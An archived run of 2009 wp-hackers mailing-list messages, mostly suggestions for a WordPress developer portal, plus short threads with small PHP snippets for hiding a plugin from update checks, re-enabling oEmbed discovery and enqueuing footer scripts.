now.

From otto at ottodestruct.com  Tue Dec 15 19:41:20 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 15 Dec 2009 13:41:20 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912151136r436bc7dfu93281ec810a659c8@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de> 
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com> 
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com> 
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com> 
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com> 
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com> 
	<161617690912151044q63a569e1y2149424c9ec9429f@mail.gmail.com> 
	<862d087f0912151136r436bc7dfu93281ec810a659c8@mail.gmail.com>
Message-ID: <161617690912151141w77f3e6a8j3b6d545043e35085@mail.gmail.com>

On Tue, Dec 15, 2009 at 1:36 PM, Nathan Rice <ncrice at gmail.com> wrote:
> Historically, though, these people have either been too few in number, or
> too busy to update the Codex themselves.

I don't update the codex much mainly because I think it's ugly as sin,
hard to use, and annoying in general. This is basically the same
reason I don't use bbPress.

If it looked more modern or something, I might use it more. Can't
really define what it is about it, but it actively drives me away from
using it. Don't much care for the design of the wp.org forums either.

Actually, wp.org designs in general bug me. Maybe it's the fixed width
stuff. I dislike it when websites intentionally limit their content to
what amounts to a small column taking up only about 1/6th of my
screen. Makes them hard to use, and the excess whitespace hurts my
eyes.


-Otto
Sent from Memphis, TN, United States

From himself at arnebrachhold.de  Wed Dec 16 00:15:34 2009
From: himself at arnebrachhold.de (Arne Brachhold)
Date: Wed, 16 Dec 2009 01:15:34 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com>

On Fri, Dec 11, 2009 at 21:37, Matt Mullenweg <m at mullenweg.com> wrote:
> If there were to be a developer portal for WordPress, someplace where if
> you're first getting started with hacking on WP, building plugins, creating
> themes, you could go and it'd have all the best resources in one place, what
> resources do you think would be important to have there?

I really like the style of php.net, what about a combination of the
phpDoc and additional information? The phpDoc itself is lacking of
examples how different functions work together, additional tutorials
or more complex examples may easily get outdated or wont't provide
enough technical information (which the phpDoc might have).

So what I would like to have is:

* A clean documentation divided in major topics, for example: "WP
Query", "Database Access", "Security" or "Configuration" with simple
tutorials and "Howtos".
* Links to the corresponding phpDoc functions in each topic in case
you need more technical details
* A usable search engine, which finds what I search for (or even what
I didn't). If I search on php.net for "get_property" I also get the
results for "get_properties", "reflectionproperty" etc.
* A list of hooks divided into categories (for example "posts",
"comments") so I know where to look (since the hooks are not always
properly named).
* Revisions? It must be clear in the examples and tutorials in which
WP version they work. I like the MSDN or Symfony style where I can
switch within different (.Net / Symfony) versions of the same topic.
* Separated languages. It's nice if somebody translated the English
articles, but I don't want to see the same documentation in 30
languages in the search results.

What I really don't like about the current codex:
* Not well structured / linked / organized
* Bad search result
* Often outdated
* Hard to handle and edit

Regardless of how this could be implemented, I think a combination of
wiki style articles, "best practices", examples and generated phpDoc
would be quite easy to use and understand.

Regards,

-- Arne

From ncrice at gmail.com  Wed Dec 16 00:24:15 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Tue, 15 Dec 2009 19:24:15 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com>
Message-ID: <862d087f0912151624j6ea538d4h40004097787296e8@mail.gmail.com>

Absent the possibility of linking out to other articles (officially, at
least), I vote for the PHP.net system as well. I've found the comments under
the official documentation to be invaluable on many occasions.

To me, a wiki style editor for the main documentation + comments underneath
would be a great feature for the Codex. Also, it'd be ideal if the comments
were displayed in the order of relevance, and let the community vote on what
comments get promoted to the top of the list. Also, bury comments that are
useless banter (it's not a discussion board), irrelevant, incorrect, etc.

I know I personally don't feel like wading through 300+ comments to find the
relevant ones.

And for goodness sake, please don't allow
trackbacks/pingbacks/whatever-you-want-to-call-them.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Tue, Dec 15, 2009 at 7:15 PM, Arne Brachhold <himself at arnebrachhold.de>wrote:

> On Fri, Dec 11, 2009 at 21:37, Matt Mullenweg <m at mullenweg.com> wrote:
> > If there were to be a developer portal for WordPress, someplace where if
> > you're first getting started with hacking on WP, building plugins,
> creating
> > themes, you could go and it'd have all the best resources in one place,
> what
> > resources do you think would be important to have there?
>
> I really like the style of php.net, what about a combination of the
> phpDoc and additional information? The phpDoc itself is lacking of
> examples how different functions work together, additional tutorials
> or more complex examples may easily get outdated or wont't provide
> enough technical information (which the phpDoc might have).
>
> So what I would like to have is:
>
> * A clean documentation divided in major topics, for example: "WP
> Query", "Database Access", "Security" or "Configuration" with simple
> tutorials and "Howtos".
> * Links to the corresponding phpDoc functions in each topic in case
> you need more technical details
> * A usable search engine, which finds what I search for (or even what
> I didn't). If I search on php.net for "get_property" I also get the
> results for "get_properties", "reflectionproperty" etc.
> * A list of hooks divided into categories (for example "posts",
> "comments") so I know where to look (since the hooks are not always
> properly named).
> * Revisions? It must be clear in the examples and tutorials in which
> WP version they work. I like the MSDN or Symfony style where I can
> switch within different (.Net / Symfony) versions of the same topic.
> * Separated languages. It's nice if somebody translated the English
> articles, but I don't want to see the same documentation in 30
> languages in the search results.
>
> What I really don't like about the current codex:
> * Not well structured / linked / organized
> * Bad search result
> * Often outdated
> * Hard to handle and edit
>
> Regardless of how this could be implemented, I think a combination of
> wiki style articles, "best practices", examples and generated phpDoc
> would be quite easy to use and understand.
>
> Regards,
>
> -- Arne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From beau at dentedreality.com.au  Wed Dec 16 01:51:22 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Tue, 15 Dec 2009 22:51:22 -0300
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912151624j6ea538d4h40004097787296e8@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com>
	<862d087f0912151624j6ea538d4h40004097787296e8@mail.gmail.com>
Message-ID: <902424490912151751hea3edddp8903be1363b82b4a@mail.gmail.com>

> To me, a wiki style editor for the main documentation + comments underneath
> would be a great feature for the Codex. Also, it'd be ideal if the comments
> were displayed in the order of relevance, and let the community vote on what
> comments get promoted to the top of the list. Also, bury comments that are
> useless banter (it's not a discussion board), irrelevant, incorrect, etc.

Personally, I think comments need to be moderated, so that only the
truly useful/valuable comments, which contribute something of direct
relevance to that piece of documentation are allowed (a la PHP docs,
which are clearly heavily moderated).

> And for goodness sake, please don't allow
> trackbacks/pingbacks/whatever-you-want-to-call-them.

100% agree.

From lists at rotorised.com  Wed Dec 16 02:10:34 2009
From: lists at rotorised.com (Ryan McCue)
Date: Wed, 16 Dec 2009 12:10:34 +1000
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B27D79F.3040803@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
	<op.u4s65yocr6yny2@toscho.de>	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<4B27D79F.3040803@mullenweg.com>
Message-ID: <4B28419A.60506@rotorised.com>

Matt Mullenweg wrote:
> My original question wasn't "how do we get people to contribute to a
> documentation resource" which honestly I'm not worried about, it was
> "What do you wish you had when you first started developing for
> WordPress?"

Everyone appears to be talking about the colour of the bikeshed, rather
than which bikes they'd like.

-- 
Ryan McCue
<http://ryanmccue.info/>


From zamoose at gmail.com  Wed Dec 16 02:23:46 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Tue, 15 Dec 2009 21:23:46 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <902424490912151751hea3edddp8903be1363b82b4a@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com> 
	<862d087f0912151624j6ea538d4h40004097787296e8@mail.gmail.com> 
	<902424490912151751hea3edddp8903be1363b82b4a@mail.gmail.com>
Message-ID: <71ddd7490912151823n5ba4472ck1fa513770e32ad8f@mail.gmail.com>

On Tue, Dec 15, 2009 at 8:51 PM, Beau Lebens <beau at dentedreality.com.au>wrote:

>
>
> > And for goodness sake, please don't allow
> > trackbacks/pingbacks/whatever-you-want-to-call-them.
>
> 100% agree.
>
> I disagree. As long as they're moderated, they could function as
"Community-contributed (or suggested) Links" so that, in addition to
user-supplied commentary, we could have links back to relevant tutorials,
albeit in a diminished fashion...


-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From info at toscho.de  Wed Dec 16 02:38:15 2009
From: info at toscho.de (Thomas Scholz)
Date: Wed, 16 Dec 2009 03:38:15 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <71ddd7490912151823n5ba4472ck1fa513770e32ad8f@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com>
	<862d087f0912151624j6ea538d4h40004097787296e8@mail.gmail.com>
	<902424490912151751hea3edddp8903be1363b82b4a@mail.gmail.com>
	<71ddd7490912151823n5ba4472ck1fa513770e32ad8f@mail.gmail.com>
Message-ID: <op.u40ex1f7r6yny2@toscho.de>

Doug Stewart:

> [trackbacks/pingbacks/whatever-you-want-to-call-them]
>>
> As long as they're moderated, they could function as
> "Community-contributed (or suggested) Links" so that, in addition to
> user-supplied commentary, we could have links back to relevant tutorials,
> albeit in a diminished fashion...

Who should moderate links from non-english sites? These links are the  
majority. I don?t think that could work.

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From wp-hackers at striderweb.com  Wed Dec 16 03:58:11 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Tue, 15 Dec 2009 21:58:11 -0600
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <26735.207.135.184.38.1260831588.squirrel@striderweb.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
	<71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com>
	<31D97E2E-996B-48C9-B093-BFBE9AE6BBD9@striderweb.com>
	<e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>
	<26735.207.135.184.38.1260831588.squirrel@striderweb.com>
Message-ID: <36711832-235A-4B7E-A68E-64736A608B61@striderweb.com>

>> Has anyone created a Codex page about this whole issue? It would be
>> good to have this code there. Anyone with strong feelings about the
>> issue want to put one together? It could have sections explaining each
>> part of the update process and have ways of circumventing each:
>> Sending url, sending server info, sending plugins list.

Mark Jaquith posted this on his site, but I thought it should be repeated here for those coming to this thread later in the archives....

function cws_hidden_plugin_12345( $r, $url ) {
	if ( 0 !== strpos( $url, 'http://api.wordpress.org/plugins/update-check' ) )
		return $r; // Not a plugin update request. Bail immediately.
	$plugins = unserialize( $r['body']['plugins'] );
	unset( $plugins->plugins[ plugin_basename( __FILE__ ) ] );
	unset( $plugins->active[ array_search( plugin_basename( __FILE__ ), $plugins->active ) ] );
	$r['body']['plugins'] = serialize( $plugins );
	return $r;
}
add_filter( 'http_request_args', 'cws_hidden_plugin_12345', 5, 2 );

More here: <http://markjaquith.wordpress.com/2009/12/14/excluding-your-plugin-or-theme-from-update-checks/>

Thank you Mark!

-- 
Stephen Rider
http://striderweb.com/


From malaiac at gmail.com  Wed Dec 16 09:06:06 2009
From: malaiac at gmail.com (Malaiac)
Date: Wed, 16 Dec 2009 10:06:06 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B27D79F.3040803@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<4B27D79F.3040803@mullenweg.com>
Message-ID: <59e7f3130912160106h5ca17e3bhead63ab6767c6abf@mail.gmail.com>

2009/12/15 Matt Mullenweg <m at mullenweg.com>
> My original question wasn't "how do we get people to contribute to a
> documentation resource" which honestly I'm not worried about, it was "What
> do you wish you had when you first started developing for WordPress?"
>
> Anyone else have any wishlist items that haven't been mentioned yet?

A full description of how a WordPress page is generated, from clean
URL to generated HTML.
That includes :
- WP Rewrite description of how a clean URL is handled
- a description of how the WP controller (sort of) knows which page is
called and which posts are going to be fetched
- a full tree of hooks which allows me to know which one I need to use
(I have more than 20 WP in prod, and still have troubles finding the
right hook sometimes)

Actually, that's the first thing I'm looking for when I shop for a new
CMS (I'm currently switching from OsCommerce to... Prestashop ? for my
ecommerce websites) : since I know I'm going to hack it, I need to
know I'm going to suffer doing it (obviously a Template system like
Smarty in Prestashop is an obstacle, but general handling of clean URL
> true URL > where are we > which items are we going to fetch > which
template is used > let's generate the html is my main point of
concern).

M

From aaron at xavisys.com  Wed Dec 16 13:52:14 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Wed, 16 Dec 2009 06:52:14 -0700
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B27D79F.3040803@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
	<op.u4s65yocr6yny2@toscho.de>	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<4B27D79F.3040803@mullenweg.com>
Message-ID: <4B28E60E.20802@xavisys.com>

People have already named almost everything I can think of (svn, howto 
create a patch, code examples, etc).  One that I haven't seen (but I 
haven't completely read every message in this thread) is coding 
standards.  These vary from project to project (for example, if you 
contribute to Zend Framework you need to format code differently than if 
you contribute to WordPress), so it would be great to have them 
available even for experienced developers.

Also, I know that PHP.net has been mentioned quite a bit.  I definitely 
find it extremely useful for 90% of functions, so it's a great example.  
Something about PHP.net that I love and haven't seen mentioned is their 
shortened URLs that you can use.  For example, if you search on the site 
for 'date' to find one of the more obscure formatters, the url would be 
http://us.php.net/manual/en/function.date.php but if I know exactly what 
I'm looking for I don't have to use that URL, I just use 
http://php.net/date (easy to remember).

Matt Mullenweg wrote:
> My original question wasn't "how do we get people to contribute to a 
> documentation resource" which honestly I'm not worried about, it was 
> "What do you wish you had when you first started developing for 
> WordPress?"
>
> Anyone else have any wishlist items that haven't been mentioned yet?

From wp-hackers at striderweb.com  Wed Dec 16 16:13:31 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 16 Dec 2009 10:13:31 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B28E60E.20802@xavisys.com>
References: <4B22AD95.8040401@mullenweg.com>
	<op.u4s65yocr6yny2@toscho.de>	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<4B27D79F.3040803@mullenweg.com> <4B28E60E.20802@xavisys.com>
Message-ID: <1A0B9563-649E-45F0-81E8-92F31AB77C92@striderweb.com>


On Dec 16, 2009, at 7:52 AM, Aaron D. Campbell wrote:

> One that I haven't seen (but I haven't completely read every message in this thread) is coding standards.  These vary from project to project (for example, if you contribute to Zend Framework you need to format code differently than if you contribute to WordPress), so it would be great to have them available even for experienced developers.

Ahem: <http://lmgtfy.com/?q=wordpress+coding+standards&l=1>

;-)

Stephen

From jer at simianuprising.com  Wed Dec 16 16:35:23 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 16 Dec 2009 11:35:23 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<cb1226600912151615o2784a8ecgf94682a244c65e1d@mail.gmail.com>
Message-ID: <e1202cb10912160835t27e552d0i70862a896d316828@mail.gmail.com>

Re: Moderated comments and whether to allow tutorial links -

I think having comment 'types' like in p2 would make sense in this
case. A comment can be some text in-itself, with an explanation and
the ability to add syntax-colored PHP code, but you should also be
able to switch modes and instead make your comment a 'posted link'.
You'd give the url and a short description of why people should click
it. I think this would allow both types of submissions to prosper
together and the resulting mix would regulate itself based on
contributions. They could also share whatever voting system was put in
place to keep things organized.

Not-yet-mentioned but manadatory would be a 'flagging' system included
with the up/down voting to mark something as spam, irrelevant etc.

Also +1 for carefully considering how this system will play out WRT
multilingualism. At some point deep in the past I added a third-party
'browser bar search' thing for the codex in my firefox that gives
different results from the current 'search the codex' feature on the
site. It is incredibly useful to me because for whatever reason it
filters out the non-english sites in a way that the wordpress.org
version doesn't. Keeping languages distinct helps everyone.

On Tue, Dec 15, 2009 at 7:15 PM, Arne Brachhold
<himself at arnebrachhold.de> wrote:
> * A clean documentation divided in major topics, for example: "WP
> Query", "Database Access", "Security" or "Configuration" with simple
> tutorials and "Howtos".

I think the best way to accomplish this would be to use a category
taxonomy that applies to the content of this site (ideally a WP site
as already stated). It would allow the functions/hooks to all be on
the same level in the system but also give a good way to browse
functionality using the categories or narrow search results using
search terms+categories. This already exists in the Codex, but as
anyone familiar with MediaWiki categories knows they aren't
particularly easy to use. If the developer portal allowed people to
use their wordpress.org login credentials then adding categories would
be as easy as editing the post and looking through the list for what's
relevant.


Re: recognition for public documentation -

It's not exactly impressive or particularly well put together to
emphasize my contributions, but this page exists :

http://codex.wordpress.org/Special:Contributions/Jeremyclarke

If I was trying to impress a particular client, or trying to beef up
my resume, I could use that link as proof that I'm committed to WP.
The problem is its not much to look at and e.g. doesn't state my total
edits. I wouldn't want clients to actually look too closely cause the
details are boring, but I could say something like "I do a lot of
edits on functionality important to me, to see exactly what I've done
see [this link]" and that page would the proof in case they want to
check.

In the new system I think having a summary like that would be very
useful for people like me, especially if it was done with recognition
(rather than, say, auditing) in mind. A big number showing my total
edits, lines edited, etc at the top along with my profile picture
could be a big help. Obviously it should also be integrated with
profiles.wordpress.org.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From wp-hackers at tobias.baethge.com  Wed Dec 16 16:35:43 2009
From: wp-hackers at tobias.baethge.com (wp-hackers at tobias.baethge.com)
Date: Wed, 16 Dec 2009 17:35:43 +0100 (CET)
Subject: [wp-hackers] =?utf-8?q?=5B_wp-hackers_=5D_Developer_portal?=
In-Reply-To: <1A0B9563-649E-45F0-81E8-92F31AB77C92@striderweb.com>
Message-ID: <20091216163544.55629181B04DA@dd19416.kasserver.com>

Hi,
 
> [Coding Standards]
> 
> Ahem: http://lmgtfy.com/?q=wordpress+coding+standards&l=1

While I really like these Coding Standards and try to adhere them in my plugins, they don't seem to be very popular throughout WordPress (at least the core). Most patch submitters and committers don't regularly follow them unfortunately.
But of course it's a good idea to give plugin authors something to learn from!

Regards,
Tobias





From wp-hackers at tobias.baethge.com  Wed Dec 16 16:48:14 2009
From: wp-hackers at tobias.baethge.com (TobiasBg)
Date: Wed, 16 Dec 2009 17:48:14 +0100 (CET)
Subject: [wp-hackers] =?utf-8?q?Plugin_API=3A_Plugin_Upgrate_Notice_=3F?=
Message-ID: <20091216164814.817EA181B04DA@dd19416.kasserver.com>

Hi,

I just saw in the commit [12374] (http://core.trac.wordpress.org/changeset/12374) by Ryan that there is a value "upgrade_notice", supposedly returned from the Plugins API at api.wordpress.org.

I assume that plugins can use this to show the user a message with further update instructions or warnings or similar things.

Now: How can a plugin author use that and set an actual message?

Thanks!
Tobias




From tonyscott100 at yahoo.co.uk  Wed Dec 16 17:58:35 2009
From: tonyscott100 at yahoo.co.uk (Tony Scott)
Date: Wed, 16 Dec 2009 09:58:35 -0800 (PST)
Subject: [wp-hackers] Developer portal
In-Reply-To: <59e7f3130912160106h5ca17e3bhead63ab6767c6abf@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<4B27D79F.3040803@mullenweg.com>
	<59e7f3130912160106h5ca17e3bhead63ab6767c6abf@mail.gmail.com>
Message-ID: <433039.21107.qm@web24501.mail.ird.yahoo.com>

+1

 Tony


----
Tony Scott
http://tonyscott.org.uk | http://twitter.com/tonys
http://uk.wordcamp.org | http://hackspace.org.uk



----- Original Message ----
> From: Malaiac <malaiac at gmail.com>

> A full description of how a WordPress page is generated, from clean
> URL to generated HTML.
> That includes :
> - WP Rewrite description of how a clean URL is handled
> - a description of how the WP controller (sort of) knows which page is
> called and which posts are going to be fetched
> - a full tree of hooks which allows me to know which one I need to use
> (I have more than 20 WP in prod, and still have troubles finding the
> right hook sometimes)
> 



      

From jer at simianuprising.com  Wed Dec 16 19:18:43 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 16 Dec 2009 14:18:43 -0500
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <4B27D0A9.1020901@adcSTUDIO.com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
	<161617690912110939o60a9a2c8h2a5094661424bcda@mail.gmail.com>
	<e1202cb10912131647j38a509dcob21c23f3f9fdad36@mail.gmail.com>
	<4B27D0A9.1020901@adcSTUDIO.com>
Message-ID: <e1202cb10912161118o591cf0c2ud65a6367aed53933@mail.gmail.com>

On Tue, Dec 15, 2009 at 1:08 PM, Ken Newman <Ken at adcstudio.com> wrote:
> Should this be added here? http://codex.wordpress.org/WordPress_API's

Good point Ken. Someone had already added it to the list but I also
went in and added a description to the page and created an API
category and applied it to all the articles.


-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From otto at ottodestruct.com  Wed Dec 16 19:42:08 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 16 Dec 2009 13:42:08 -0600
Subject: [wp-hackers] How to fix oEmbed in 2.9
Message-ID: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com>

I'm very disappointed that the core team has decided to cripple the
new oEmbed functionality in 2.9 by intentionally disabling the
discovery mode and removing the option to enable it.

So here's the fix for this 2.9 misfeature:

add_filter('embed_oembed_discover', create_function('$a','return true;'));

You can add that into a plugin or your theme's functions.php file and
oEmbed will be up and working again, with full uncrippled power.

-Otto

From liste at srpski.biz  Wed Dec 16 19:50:36 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Wed, 16 Dec 2009 20:50:36 +0100
Subject: [wp-hackers] How to fix oEmbed in 2.9
In-Reply-To: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com>
References: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com>
Message-ID: <9b6c20460912161150u439b5177m4b724f1c9cf89c8b@mail.gmail.com>

Alex created a plugin for this earlier today.
http://www.viper007bond.com/2009/12/15/new-plugin-enable-oembed-discovery/

2009/12/16 Otto <otto at ottodestruct.com>

> I'm very disappointed that the core team has decided to cripple the
> new oEmbed functionality in 2.9 by intentionally disabling the
> discovery mode and removing the option to enable it.
>
> So here's the fix for this 2.9 misfeature:
>
> add_filter('embed_oembed_discover', create_function('$a','return true;'));
>
> You can add that into a plugin or your theme's functions.php file and
> oEmbed will be up and working again, with full uncrippled power.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Wed Dec 16 19:53:39 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 16 Dec 2009 13:53:39 -0600
Subject: [wp-hackers] How to fix oEmbed in 2.9
In-Reply-To: <9b6c20460912161150u439b5177m4b724f1c9cf89c8b@mail.gmail.com>
References: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com> 
	<9b6c20460912161150u439b5177m4b724f1c9cf89c8b@mail.gmail.com>
Message-ID: <161617690912161153n720664eex96b433674a4066a0@mail.gmail.com>

Cool, didn't know that.

I prefer not to use plugins for simple one-liners because of the
overhead though.

-Otto



On Wed, Dec 16, 2009 at 1:50 PM, Milan Dini? <liste at srpski.biz> wrote:
> Alex created a plugin for this earlier today.
> http://www.viper007bond.com/2009/12/15/new-plugin-enable-oembed-discovery/
>
> 2009/12/16 Otto <otto at ottodestruct.com>
>
>> I'm very disappointed that the core team has decided to cripple the
>> new oEmbed functionality in 2.9 by intentionally disabling the
>> discovery mode and removing the option to enable it.
>>
>> So here's the fix for this 2.9 misfeature:
>>
>> add_filter('embed_oembed_discover', create_function('$a','return true;'));
>>
>> You can add that into a plugin or your theme's functions.php file and
>> oEmbed will be up and working again, with full uncrippled power.
>>
>> -Otto
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at tobias.baethge.com  Wed Dec 16 20:49:39 2009
From: wp-hackers at tobias.baethge.com (TobiasBg)
Date: Wed, 16 Dec 2009 21:49:39 +0100 (CET)
Subject: [wp-hackers] =?utf-8?q?wp_=5F_enqueue_=5F_script=28=29_not_workin?=
	=?utf-8?q?g_while_in_the_Loop?=
Message-ID: <20091216204940.2403C181B04DB@dd19416.kasserver.com>

Hi,

for a plugin, I'm trying to achieve something really simple (I would think):
I have a shortcode that gets replaced with some string, as usual.
Now I want to enqueue a JavaScript file *to the footer* while parsing the Shortcode.
That way, the JS file will only be included on pages where the Shortcode is actually shown.
And by using wp_enqueue_script I can make sure that it is still only loaded once in case there is more than one of the same Shortcodes on the page.

Now the problem: It doesn't work. It seems that I can not enqueue a script to the footer, while I'm already in the Loop, although there's nothing that should prohibit that.

Can someone kindly point me to the right direction? Am I doing something wrong or is it just not possible to add scripts to the footer like that? (If not, it should.) Thanks!

This is a short demo plugin, illustrating what I'm trying to do. It works except for the inclusion of the JS.
To try it, just put a shortcode like [demo foo="my-string" /] into a post.

##################################################
<?php
/*
Plugin Name: Demo Enqueue Script
*/

function demo_shortcode_handler( $atts ) {
    $default_atts = array( 'foo' => 'bar' );
    $atts = shortcode_atts( $default_atts, $atts );
    
    // why does the JS not show up?
    wp_enqueue_script( 'demo-js', 'path/to/demo.js', false, '1.0', true );

    return 'Your foo argument was: ' . $atts['foo'];
}

add_shortcode( 'demo', 'demo_shortcode_handler' );

##################################################

Thanks a lot!
Tobias




From jeffc at wptavern.com  Wed Dec 16 21:12:49 2009
From: jeffc at wptavern.com (Jeff Chandler)
Date: Wed, 16 Dec 2009 16:12:49 -0500
Subject: [wp-hackers]  Developer portal
Message-ID: <4B294D51.9070806@wptavern.com>

I'm no developer but just about all of the suggestions that center 
around documentation I believe would have been solved had the 
Documentation handbooks be put into service. The handbooks would have 
been like WordPress with people creating patches or edits to various 
bits of the handbook which would have been committed by a documentation 
team member. However, the handbook runs into the same problem as the 
codex. Lack of contributors, and contributors that know the ins and outs 
of the software.

Regardless, I think this is all good discussion for the Documentation 
mailing list, not for this specific topic. Everyone wants more 
documentation but no one wants to write it. Would be interesting to know 
if this is a problem that can ever be solved without brining money into 
the equation.

From aldolat at gmail.com  Wed Dec 16 21:24:53 2009
From: aldolat at gmail.com (Aldo Latino)
Date: Wed, 16 Dec 2009 22:24:53 +0100
Subject: [wp-hackers] How to fix oEmbed in 2.9
In-Reply-To: <161617690912161153n720664eex96b433674a4066a0@mail.gmail.com>
References: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com>
	<9b6c20460912161150u439b5177m4b724f1c9cf89c8b@mail.gmail.com>
	<161617690912161153n720664eex96b433674a4066a0@mail.gmail.com>
Message-ID: <1260998693.25350.6.camel@zen>

Slightly OT.

Is it possible - via functions.php - to modify the code returned by
oEmbed for flash videos? The modification should add this line
<param name='wmode' value='transparent' />

and wmode to embed tag:
<embed ... wmode="transparent" ... >

